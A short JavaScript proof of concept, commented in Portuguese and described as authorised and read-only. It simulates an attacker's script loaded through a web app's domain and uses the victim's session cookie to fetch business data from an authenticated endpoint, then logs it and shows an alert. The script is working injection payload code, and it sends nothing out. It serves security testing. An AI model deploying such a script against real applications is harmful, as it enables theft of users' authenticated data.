// PoC de seguranca autorizado - conteudo benigno, apenas LEITURA.
// Simula o "servidor do atacante": ficheiro externo servido como JS pelo dominio da app.
// Prova que o codigo corre com a sessao da vitima e consegue ler dados autenticados.
(function () {
    try {
        console.log("[PoC] a correr em", location.origin);

        // Chama uma API autenticada da propria app com a sessao da vitima (cookie incluido).
        // GetProcessList devolve os processos/casos atribuidos ao utilizador = dados de negocio.
        fetch("/UsersV2/GetProcessList", { credentials: "include" })
            .then(function (r) { return r.text(); })
            .then(function (data) {
                console.log("[PoC] dados autenticados lidos com a sessao da vitima:", data);
                alert("[PoC] Script externo a correr em " + location.host +
                      "\nLeu " + data.length + " bytes de dados autenticados da vitima (ver Console).");
            })
            .catch(function (e) { console.log("[PoC] erro ao ler dados:", e); });
    } catch (e) {
        console.log("[PoC] erro:", e);
    }
})();
